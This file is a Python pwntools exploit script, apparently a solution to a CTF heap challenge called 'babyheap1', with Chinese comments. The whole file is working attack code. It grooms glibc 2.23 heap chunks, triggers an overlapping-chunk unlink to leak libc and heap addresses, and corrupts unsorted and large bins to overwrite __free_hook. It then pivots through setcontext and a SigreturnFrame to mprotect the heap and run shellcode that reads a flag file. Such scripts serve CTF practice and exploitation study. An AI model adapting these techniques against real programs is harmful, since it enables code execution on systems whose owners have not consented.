#! /usr/bin/env python3
from pwn import *

arch = 64
challenge = './babyheap1'

context.os='linux'
context.log_level = 'debug'
if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(challenge)
libc = ELF('libc-2.23.so')

local = 1
if local:
    p = process(challenge)
else:
    p = remote('chuj.top', '53178')


def debug():
    gdb.attach(p)
    pause()

bps = [0xD59,0xE2C]
pie = 1
def gdba():
    if local == 0:
        return 0
    cmd ='set follow-fork-mode parent\n'
    #cmd=''
    if pie:
        base = int(os.popen("pmap {}|awk '{{print $1}}'".format(p.pid)).readlines()[1],16)
        cmd += ''.join(['b *{:#x}\n'.format(b+base) for b in bps])
        cmd += 'set $base={:#x}\n'.format(base)
    else:
        cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])

    gdb.attach(p,cmd)

def eat():
    p.recvuntil('oice: \n')

def add(size):
    eat()
    p.sendline('1')
    p.recvuntil('Size: ')
    p.sendline(str(size))

def edit(index, content):
    eat()
    p.sendline('2')
    p.recvuntil('Index: ')
    p.sendline(str(index))
    p.recvuntil('Content: ')
    p.send(content)

def delete(index):
    eat()
    p.sendline('3')
    p.recvuntil('Index: ')
    p.sendline(str(index))

def show(index):
    eat()
    p.sendline('4')
    p.recvuntil('Index: ')
    p.sendline(str(index))


while True:
    arch = 64
    challenge = './babyheap1'

    context.os = 'linux'
    context.log_level = 'debug'
    if arch == 64:
        context.arch = 'amd64'
    if arch == 32:
        context.arch = 'i386'
    context.terminal = ['tmux', 'splitw', '-h']
    elf = ELF(challenge)
    libc = ELF('libc-2.23.so')

    local = 1
    if local:
        p = process(challenge)
    else:
        p = remote('chuj.top', '53178')
    # 堆布局
    add(0x18)# 0
    add(0x508)# 1
    add(0xf8)# 2
    
    add(0x18)# 3
    add(0x508)# 4
    add(0xf8)# 5
    
    add(0x18)# 6 防止进 top
    
    
    delete(1)
    add(0x18)# 1
    add(0x4e8)#! 7
    
    delete(1)
    edit(7, b'a'*0x4e0+p64(0x510))
    
    delete(2)#! unlink
    add(0x18)# 1
    
    show(7)
    unsorted_addr = (u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')))
    libc.address = unsorted_addr - 0x3c4b78
    log.success('libc.address: ' + hex(libc.address))
    
    delete(1)
    add(0x38)# 1
    add(0x5c8)# 2 0x5d0 unsorted
    
    
    delete(4)
    add(0x18)# 4
    add(0x4e8)#! 8
    delete(4)
    
    edit(8, b'a'*0x4e0+p64(0x510))
    delete(5)#! unlink
    
    add(0x18)# 4
    
    delete(1)
    delete(2)
    
    add(0x5e8)  # 1
    add(0x18)  # 2
    delete(1)
    show(8)
    heap_base = u64(p.recvuntil('\n', drop='True').ljust(8, b'\x00'))-0x40
    log.success('heap_base: ' + hex(heap_base))
    
    delete(4)
    delete(2)
    
    add(0x38)# 1
    add(0x5c8)# 2 0x5d0 unsorted
    
    
    add(0x48)# 4
        # 0x5c0 large
    
    delete(2)
    
    add(0x5c8)  # 2
    
    delete(2)
    
    free_hook = libc.sym['__free_hook']
    log.success('free_hook: ' + hex(free_hook))
    mprotect_addr = libc.symbols['mprotect']
    log.success('mprotect_addr: ' + hex(mprotect_addr))
    setcontext_addr = libc.symbols['setcontext']
    log.success('setcontext_addr: ' + hex(setcontext_addr))
    
    evil = free_hook - 0x10
    unsorted = p64(0) * 2 + p64(0) + p64(0x5d1) + p64(0) + p64(evil) + p64(0) + p64(0)
    edit(7, unsorted)  # unsorted 伪造 bk

    large = p64(0) * 4 + p64(0) + p64(0x5c1) + p64(0) + p64(evil + 0x8) + p64(0) + p64(evil - 0x20 + 8 - 5)
    edit(8, large)  # large 伪造 bk_nextsize bk

    try:
        add(0x48)  # 2
        shellcode = asm(shellcraft.open("./flag", 0))
        shellcode += asm(shellcraft.read(3, heap_base + 0x10, 0x30))
        shellcode += asm(shellcraft.write(1, heap_base + 0x10, 0x30))
        
        heap_addr = heap_base + 0x40 + 0x10
        log.success('heap_addr: ' + hex(heap_addr))
        
        frame = SigreturnFrame()

        frame.rdi = heap_base & 0xfffffffffffff000
        frame.rsi = 0x21000
        frame.rdx = 7
        
        frame.rip = mprotect_addr
        frame.rsp = heap_addr + len(bytes(frame))
        # payload = str(frame)
        print(len(bytes(frame)))
        payload = bytes(frame) + p64(heap_addr + len(bytes(frame)) + 8) + shellcode
        
        edit(7, payload + b'\n')
        
        edit(2, p64(setcontext_addr + 53)[:-2] + b'\n')
        delete(7)
        
        
    except EOFError:
        p.close()
        continue
    else:
        p.interactive()
        break
